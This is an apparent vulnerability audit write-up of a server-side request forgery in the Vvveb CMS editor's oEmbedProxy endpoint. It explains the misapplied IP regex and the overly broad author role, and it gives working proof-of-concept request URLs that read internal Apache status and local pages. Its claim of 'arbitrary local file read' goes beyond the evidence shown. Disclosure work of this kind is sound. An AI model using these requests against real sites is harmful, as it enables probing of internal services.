# Low-Privilege SSRF in Vvveb CMS Backend Editor `oEmbedProxy`

Audit Date: 2026-04-16  
Target Project: `D:\phpstudy_pro\WWW\latest`  
Analysis Target: The SSRF formation chain, code-level root cause, low-privilege reachability, and exploitation conditions of the backend editor endpoint `/admin/index.php?module=editor/editor&action=oEmbedProxy`

## 1. Summary

The root cause of this vulnerability is not simply that “the URL is not filtered,” but that the entire backend editor chain has two issues at the same time:

1. The low-privilege `author` role is granted `editor/*` by default
2. The IP restriction in `validateUrl()` is implemented incorrectly: it validates the full URL rather than the parsed hostname

Therefore, from a code-chain perspective, the complete formation path is:

1. A low-privilege backend account enters `editor/editor`
2. A request is made with `action=oEmbedProxy`
3. `Editor::oEmbedProxy()` directly reads `$_GET['url']`
4. `getUrl()` calls `validateUrl()`
5. `validateUrl()` attempts to block IPs, but the regex matches `$url` rather than `$host`
6. Addresses such as `http://127.0.0.1/` and `http://192.168.50.1/` bypass the validation
7. The server uses `curl` / `file_get_contents` to make the request and directly returns the response content to the attacker

In terms of actual impact, this is not a weak SSRF that “can only access the 127.0.0.1 homepage,” but one that is already able to:

- Arbitrary local file read
- Arbitrary access to public Internet services

## 2. Privilege Entry Point and Routing

The vulnerability entry point is located in the backend editor controller:

- `admin/controller/editor/editor.php`

Key method:

- `admin/controller/editor/editor.php:60`

  ![image-20260417134830866](./../../source/imgs/vvveb-editor-oembedproxy-ssrf/image-20260417134830866.png)

```php
function oEmbedProxy() {
    $url = $this->request->get['url'];

    if (! $url) {
        return;
    }
    $result = getUrl($url, false);

    $this->response->setType('json');
    $this->response->output($result);
}
```

That is, a request such as:

```text
/admin/index.php?module=editor/editor&action=oEmbedProxy&url=...
```

will directly enter `Editor::oEmbedProxy()`.

## 3. Why a Low-Privilege User Can Reach This Endpoint

In the default role configuration, `author` has:

```json
{"allow":["index","content/*", "editor/*","media/media/scan","admin/user","admin/user/save"], "deny":[]}
```

This means `editor/*` is open to low-privilege `author` users by default, so this SSRF is not an “administrator-only capability.”

This is also one of the key reasons the severity of this issue increases: an ordinary low-privilege backend account can exploit it.

## 4. How User Input Reaches the Server-Side Request

In `oEmbedProxy()`, the user-controlled `url` parameter directly enters `getUrl()`:

```php
$url = $this->request->get['url'];
$result = getUrl($url, false);
```

There is no:

- Domain allowlist
- Internal network range filtering
- Additional restrictions beyond the protocol allowlist
- Sanitization of the returned content

Therefore, once validation is bypassed, the server response is returned in full.

## 5. Why Validation Fails: The IP Check in `validateUrl()` Is Incorrect

The relevant function is located at:

- `system/functions.php:1739`

  ![image-20260417134941834](./../../source/imgs/vvveb-editor-oembedproxy-ssrf/image-20260417134941834.png)

```php
function validateUrl($url) {
    if (strncmp($url, 'http', 4) === 0) {
        
        if (preg_match('/https?:\/\/(.+?)\//', $url, $matches)) {
            $host = $matches[1];

            if (strpos($host, ':') !== false) {
                return '';
            }
        
            if (strpos($host, '.') === false) {
                return '';
            }

            if (preg_match('/^(\d+\.)+\d+$/', $url, $matches)) {
                return '';
            }
            
            return $url;
        }
    }
    
    return '';
}
```

On the surface, the author appears to be trying to implement three layers of restriction:

1. Disallow explicit ports
2. Disallow hostnames without dots
3. Disallow IP addresses

But the real issue is here:

```php
if (preg_match('/^(\d+\.)+\d+$/', $url, $matches)) {
```

It matches the **full URL**, not the `$host` that has already been extracted above.  
Therefore, values such as:

```text
http://127.0.0.1/
http://192.168.50.1/
```

will not match this regex and are incorrectly allowed.

## 6. Dangerous Sink: The Server Actually Makes the Request and Reflects the Response

The function that actually makes the request is located at:

- `system/functions.php:1767`

  ![image-20260417135008546](./../../source/imgs/vvveb-editor-oembedproxy-ssrf/image-20260417135008546.png)

```php
function getUrl($url, $cache = true, $expire = 604800, $timeout = 5, $exception = true) {
    ...
    $url = validateUrl($url);
    ...
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        ...
        $result = curl_exec($ch);
        ...
        return $result;
    }
    ...
}
```

This means the vulnerability is not a blind SSRF that “only establishes a connection,” but rather:

- The server actually requests the target URL
- The response content is returned directly to the frontend

This is a **response-reflecting SSRF**.

## 7. Dynamic Verification

Through:

```text
http://127.0.0.1/server-status?auto
```

the following was actually reflected:

![image-20260417135108426](./../../source/imgs/vvveb-editor-oembedproxy-ssrf/image-20260417135108426.png)

```text
ServerVersion: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02
ServerMPM: WinNT
```

This proves that a low-privilege backend account can already probe and read local Apache status information.

```
/admin/index.php?module=editor/editor&action=oEmbedProxy&url=http://127.0.0.1/robots.txt
```



![image-20260417135127946](./../../source/imgs/vvveb-editor-oembedproxy-ssrf/image-20260417135127946.png)

Arbitrary file read

```
/admin/index.php?module=editor/editor&action=oEmbedProxy&url=http%3A%2F%2Fwww.baidu.com%2F
```



![image-20260417135207734](./../../source/imgs/vvveb-editor-oembedproxy-ssrf/image-20260417135207734.png)

It can also access Baidu and similar sites

## 9. The Nature of the Vulnerability

The nature of this vulnerability is not that “a single function failed to filter properly,” but rather:

- Low-privilege roles are granted overly broad `editor/*` capabilities
- URL validation is implemented incorrectly
- The SSRF sink directly reflects remote content

With all three combined, this issue escalates from a “backend feature flaw” to a “real SSRF exploitable by a low-privilege user.”
